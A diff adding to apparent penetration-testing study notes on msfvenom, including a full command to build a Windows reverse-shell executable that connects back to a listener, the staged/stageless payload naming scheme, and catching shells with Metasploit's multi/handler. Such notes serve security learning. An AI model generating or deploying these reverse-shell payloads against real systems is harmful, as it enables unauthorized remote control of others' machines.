@@ -36,3 +36,45 @@ based on output values type in:
 stty rows <number> 
   
 stty cols <number>
+  
+ msfvenom --list payloads 
+  
+to generate the payloads which can be used to get bind or reverse shells we can use msfvenom.
+
+```msfvenom -p <PAYLOAD> <OPTIONS>```
+  
+```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```
+
+-f: Specifies output format, -o : output location and filename
+
+When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
+
+<OS>/<arch>/<payload> : linux/x86/shell_reverse_tcp
+
+Staged vs Stageless
+
+You can send pyaloads in parts(stages) or all at once. As may be obvious this can have affects on detection based on size.
+
+Staged: Payload sent in two parts. Small stager is sent and run onserver. This is small programmer which can connect back to listener but not actually create shell. Stager can then download the bigger payload to create shell. Requires special listener like metasploits multi/handler.
+
+Stageless: send everything at once.
+
+The payload shell_reverse_tcp indicates that it is a stageless payload. Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
+shell/reverse_tcp
+
+As staged payloads are denoted with another forward slash (/).
+
+This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
+
+windows/x64/meterpreter/reverse_tcp
+
+A Linux 32bit stageless Meterpreter payload would look like this:
+
+linux/x86/meterpreter_reverse_tcp
+
+when dealing with staged payloads metasploits multi/handler is good way to catch shells.
+
+set PAYLOAD specific to target, aswell as lhost and lport 
+
+exploit -j : runs listerner as job in background
+
